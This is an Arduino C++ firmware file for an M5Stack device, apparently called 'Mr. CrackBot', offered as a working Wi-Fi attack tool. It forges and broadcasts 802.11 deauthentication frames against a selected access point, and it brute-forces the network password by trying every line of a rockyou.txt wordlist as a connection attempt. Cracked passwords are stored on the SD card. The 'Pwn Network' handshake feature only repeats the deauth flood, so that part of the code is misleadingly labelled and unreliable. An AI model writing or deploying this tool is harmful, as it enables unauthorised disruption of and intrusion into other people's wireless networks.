#include "M5Core2.h"
#include "WiFi.h"
#include "SD.h"
#include "ArduinoJson.h"
#include "WiFiManager.h"
#include "esp_wifi.h"
#include "driver/gpio.h"

#define ROCKYOU_PATH "/rockyou.txt"
#define SETTINGS_PATH "/settings.json"

struct NetworkInfo {
  String ssid;
  String bssid;
  int rssi;
  int channel;
  bool has_password;
  String password;
};

std::vector<NetworkInfo> networks;
NetworkInfo selectedNetwork;
uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

WiFiManager wifiManager;

void crackNetworkPassword();
void deauthNetwork();
void handleHandshakes();
void fillDeauthPacket(const String &bssid);
String crackPassword(const String &ssid, const String &bssid);
bool tryPassword(const String &ssid, const String &bssid, const String &password);
void displayNetworkInfo(const NetworkInfo &network);
void loadNetworksFromSD();
void saveNetworksToSD();
void setupFirmware();
void displayMenu();
void displaySettingsMenu();
void adjustBrightness();
void togglePromiscuousMode();
void resetNetworkSettings();
void scanNetworks();
void selectNetwork();
void showNetworkInfo();
void pwnNetwork();
void enterDeepSleep();
void setPromiscuousMode(bool enable);
void sendDeauthPackets(int count);
void promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type);

void crackNetworkPassword() {
  if (!selectedNetwork.ssid.isEmpty()) {
    selectedNetwork.password = crackPassword(selectedNetwork.ssid, selectedNetwork.bssid);
    saveNetworksToSD();
    displayNetworkInfo(selectedNetwork);
  } else {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
  }
}

void deauthNetwork() {
  if (!selectedNetwork.ssid.isEmpty()) {
    setPromiscuousMode(true);
    fillDeauthPacket(selectedNetwork.bssid);
    sendDeauthPackets(50);
    setPromiscuousMode(false);
  } else {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
  }
}

void handleHandshakes() {
  if (selectedNetwork.ssid.isEmpty()) {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
    return;
  }

  setPromiscuousMode(true);
  fillDeauthPacket(selectedNetwork.bssid);

  for (int i = 0; i < 50; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(50);
  }

  setPromiscuousMode(false);
}

void fillDeauthPacket(const String &bssid) {
  for (int i = 0; i < 6; ++i) {
    deauthPacket[10 + i] = strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
    deauthPacket[16 + i] = strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

String crackPassword(const String &ssid, const String &bssid) {
  File rockyouFile = SD.open(ROCKYOU_PATH, FILE_READ);
  if (!rockyouFile) {
    Serial.println("Failed to open rockyou.txt.");
    return "";
  }

  long fileSize = rockyouFile.size();
  long bytesRead = 0;
  String password;
  String line;
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("Cracking Password...");

  while (rockyouFile.available()) {
    line = rockyouFile.readStringUntil('\n');
    bytesRead += line.length() + 1;
    line.trim();
    if (tryPassword(ssid, bssid, line)) {
      password = line;
      break;
    }

    int progress = (int)((bytesRead / (float)fileSize) * 100);
    M5.Lcd.fillRect(0, 50, 320, 20, TFT_BLACK);
    M5.Lcd.setCursor(0, 50);
    M5.Lcd.printf("Progress: %d%%", progress);

    M5.update();
    if (M5.BtnA.wasPressed() || M5.BtnB.wasPressed() || M5.BtnC.wasPressed()) {
      M5.Lcd.println("User interrupted the process.");
      break;
    }
  }

  rockyouFile.close();
  return password;
}

bool tryPassword(const String &ssid, const String &bssid, const String &password) {
  Serial.printf("Trying password: %s for SSID: %s\n", password.c_str(), ssid.c_str());

  WiFi.disconnect();
  delay(100);
  WiFi.begin(ssid.c_str(), password.c_str());

  unsigned long startTime = millis();
  while (WiFi.status() != WL_CONNECTED && (millis() - startTime) < 10000) {
    delay(200);
    Serial.print(".");
  }
  
  bool isConnected = (WiFi.status() == WL_CONNECTED);
  
  if (isConnected) {
    Serial.println("Connected!");
    WiFi.disconnect();
    return true;
  } else {
    Serial.println("Failed to connect.");
    return false;
  }
}

void displayNetworkInfo(const NetworkInfo &network) {
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(2);
  M5.Lcd.printf("SSID: %s\n", network.ssid.c_str());
  M5.Lcd.printf("BSSID: %s\n", network.bssid.c_str());
  M5.Lcd.printf("RSSI: %d dBm\n", network.rssi);
  M5.Lcd.printf("Channel: %d\n", network.channel);
  M5.Lcd.printf("Has Password: %s\n", network.has_password ? "Yes" : "No");
  if (network.has_password) {
    M5.Lcd.printf("Password: %s\n", network.password.isEmpty() ? "Not cracked" : network.password.c_str());
  }
}

void loadNetworksFromSD() {
  File file = SD.open("/networks.json", FILE_READ);
  if (!file) {
    Serial.println("Failed to open networks.json.");
    return;
  }
  
  DynamicJsonDocument doc(2048);
  DeserializationError error = deserializeJson(doc, file);
  if (error) {
    Serial.println("Failed to parse JSON.");
    file.close();
    return;
  }
  
  networks.clear();
  for (JsonObject network : doc["networks"].as<JsonArray>()) {
    NetworkInfo net;
    net.ssid = network["ssid"].as<String>();
    net.bssid = network["bssid"].as<String>();
    net.rssi = network["rssi"].as<int>();
    net.channel = network["channel"].as<int>();
    net.has_password = network["has_password"].as<bool>();
    net.password = network["password"].as<String>();
    networks.push_back(net);
  }
  
  file.close();
}

void saveNetworksToSD() {
  File file = SD.open("/networks.json", FILE_WRITE);
  if (!file) {
    Serial.println("Failed to open networks.json for writing.");
    return;
  }

  DynamicJsonDocument doc(2048);
  JsonArray netArray = doc.createNestedArray("networks");
  for (const NetworkInfo &net : networks) {
    JsonObject netObj = netArray.createNestedObject();
    netObj["ssid"] = net.ssid;
    netObj["bssid"] = net.bssid;
    netObj["rssi"] = net.rssi;
    netObj["channel"] = net.channel;
    netObj["has_password"] = net.has_password;
    netObj["password"] = net.password;
  }

  if (serializeJson(doc, file) == 0) {
    Serial.println("Failed to write JSON to file.");
  }

  file.close();
}

void setupFirmware() {
  // Initialize display
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
  
  // Display initial message
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.println("Initializing firmware...");

  // Initialize WiFi
  if (WiFi.status() == WL_NO_SHIELD) {
    M5.Lcd.println("WiFi shield not present");
    while (true);
  }

  // Use WiFiManager to manage WiFi connections
  wifiManager.autoConnect("AutoConnectAP");

  // Display IP address
  IPAddress myIP = WiFi.localIP();
  M5.Lcd.printf("IP address: %s\n", myIP.toString().c_str());

  // Initialize SD card
  if (!SD.begin()) {
    M5.Lcd.println("SD Card initialization failed.");
  } else {
    M5.Lcd.println("SD Card initialized.");
  }
  
  // Load networks from SD card
  loadNetworksFromSD();
  
  // Display menu
  displayMenu();
  
  // Set initial state
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
  M5.Lcd.println("Firmware setup complete.");
}

void setup() {
  M5.begin();
  setupFirmware();
}

void loop() {
  M5.update();

  int batteryPercentage = M5.Power.getBatteryLevel();
  M5.Lcd.setCursor(260, 0);
  M5.Lcd.setTextSize(2);
  M5.Lcd.fillRect(260, 0, 60, 20, TFT_BLACK);
  M5.Lcd.printf("%d%%", batteryPercentage);

  if (M5.BtnA.wasPressed()) {
    scanNetworks();
  } else if (M5.BtnB.wasPressed()) {
    selectNetwork();
  } else if (M5.BtnC.wasPressed()) {
    showNetworkInfo();
  } else if (M5.BtnA.pressedFor(2000)) {
    pwnNetwork();
  } else if (M5.BtnB.pressedFor(2000)) {
    crackNetworkPassword();
  } else if (M5.BtnC.pressedFor(2000)) {
    deauthNetwork();
  }

  if (M5.BtnA.pressedFor(5000)) {
    enterDeepSleep();
  } else if (M5.BtnA.pressedFor(2000) && M5.BtnB.pressedFor(2000) && M5.BtnC.pressedFor(2000)) {
    displaySettingsMenu();
  }
}

void displayMenu() {
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(3);
  M5.Lcd.println("Mr. CrackBot Menu");
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("A: Scan Networks");
  M5.Lcd.println("B: Select Network");
  M5.Lcd.println("C: Show Network Info");
  M5.Lcd.println("Hold A: Pwn Network");
  M5.Lcd.println("Hold B: Crack Password");
  M5.Lcd.println("Hold C: Deauth Network");
  M5.Lcd.println("Settings: Hold all three buttons");
}

void displaySettingsMenu() {
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(3);
  M5.Lcd.println("Settings Menu");
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("A: Adjust Brightness");
  M5.Lcd.println("B: Toggle Promiscuous Mode");
  M5.Lcd.println("C: Reset Network Settings");

  while (true) {
    if (M5.BtnA.wasPressed()) {
      adjustBrightness();
    } else if (M5.BtnB.wasPressed()) {
      togglePromiscuousMode();
    } else if (M5.BtnC.wasPressed()) {
      resetNetworkSettings();
    } else if (M5.BtnA.pressedFor(2000) && M5.BtnB.pressedFor(2000) && M5.BtnC.pressedFor(2000)) {
      displayMenu();
      break;
    }
  }
}

void adjustBrightness() {
  int brightness = 100;
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("Adjust Brightness");

  while (true) {
    M5.Lcd.setCursor(0, 30);
    M5.Lcd.printf("Brightness: %d", brightness);
    M5.Lcd.fillRect(0, 60, 320, 20, TFT_BLACK);

    if (M5.BtnA.wasPressed()) {
      brightness = constrain(brightness - 10, 0, 255);
    } else if (M5.BtnC.wasPressed()) {
      brightness = constrain(brightness + 10, 0, 255);
    } else if (M5.BtnB.wasPressed()) {
      break;
    }

    ledcWrite(7, brightness); // M5Stack uses channel 7 for backlight control
    delay(100);
  }
}

void togglePromiscuousMode() {
  static bool promiscuousEnabled = false;
  promiscuousEnabled = !promiscuousEnabled;
  setPromiscuousMode(promiscuousEnabled);
  
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(2);
  M5.Lcd.printf("Promiscuous Mode: %s", promiscuousEnabled ? "Enabled" : "Disabled");
  delay(2000);
}

void resetNetworkSettings() {
  wifiManager.resetSettings();
  
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("Network settings reset.");
  delay(2000);

  ESP.restart();
}

void scanNetworks() {
  int n = WiFi.scanNetworks();
  if (n == 0) {
    M5.Lcd.println("No networks found.");
  } else {
    networks.clear();
    for (int i = 0; i < n; ++i) {
      NetworkInfo net;
      net.ssid = WiFi.SSID(i);
      net.bssid = WiFi.BSSIDstr(i);
      net.rssi = WiFi.RSSI(i);
      net.channel = WiFi.channel(i);
      net.has_password = false;
      networks.push_back(net);
    }
    saveNetworksToSD();
    M5.Lcd.println("Networks scanned and saved.");
  }
}

void selectNetwork() {
  if (networks.empty()) {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No networks to select.");
    return;
  }

  int selectedIndex = 0;
  bool selectionConfirmed = false;

  while (!selectionConfirmed) {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.setTextSize(2);

    for (int i = 0; i < networks.size(); ++i) {
      if (i == selectedIndex) {
        M5.Lcd.setTextColor(RED);
      } else {
        M5.Lcd.setTextColor(WHITE);
      }
      M5.Lcd.printf("%d: %s\n", i + 1, networks[i].ssid.c_str());
    }

    if (M5.BtnA.wasPressed()) {
      selectedIndex = (selectedIndex - 1 + networks.size()) % networks.size();
    } else if (M5.BtnC.wasPressed()) {
      selectedIndex = (selectedIndex + 1) % networks.size();
    } else if (M5.BtnB.wasPressed()) {
      selectionConfirmed = true;
    }

    delay(200);
  }

  selectedNetwork = networks[selectedIndex];
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.println("Network selected:");
  displayNetworkInfo(selectedNetwork);
}

void showNetworkInfo() {
  if (!selectedNetwork.ssid.isEmpty()) {
    displayNetworkInfo(selectedNetwork);
  } else {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
  }
}

void pwnNetwork() {
  if (!selectedNetwork.ssid.isEmpty()) {
    handleHandshakes();
  } else {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
  }
}

void enterDeepSleep() {
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.println("Entering deep sleep...");
  delay(1000);
  M5.Lcd.clear();
  esp_deep_sleep_start();
}

void setPromiscuousMode(bool enable) {
  if (enable) {
    esp_wifi_set_promiscuous_rx_cb(promiscuous_rx_cb);
    esp_wifi_set_promiscuous(true);
  } else {
    esp_wifi_set_promiscuous(false);
  }
}

void sendDeauthPackets(int count) {
  for (int i = 0; i < count; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(10);
  }
}

void promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;

  Serial.printf("Packet received: len=%d, type=%d\n", len, type);
  for (int i = 0; i < len; i++) {
    Serial.printf("%02x ", payload[i]);
  }
  Serial.println();
}
